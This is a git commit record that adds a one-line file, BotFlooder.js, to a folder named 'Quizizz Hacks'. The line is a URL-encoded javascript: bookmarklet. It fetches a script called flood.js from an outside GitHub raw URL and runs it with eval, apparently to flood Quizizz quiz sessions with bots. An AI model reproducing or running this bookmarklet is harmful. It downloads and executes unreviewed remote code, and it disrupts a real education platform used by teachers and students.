ad2b05a666ad18174a0b1c5fbf434a3f02d6124a
renzz <148696025+renzz00@users.noreply.github.com>
2024-04-13 22:57:56 -0400

    Update and rename PlaceHolder.js to BotFlooder.js

---
+++ Quizizz Hacks/BotFlooder.js
@@ -0,0 +1,1 @@
+javascript:(function()%7Bfetch("https%3A%2F%2Fraw.githubusercontent.com%2Fseanv999%2Fquizizz-flooder%2Fmain%2Fflood.js")%0A.then((res) %3D> res.text()%0A.then((t) %3D> eval(t)))%7D)()%3B
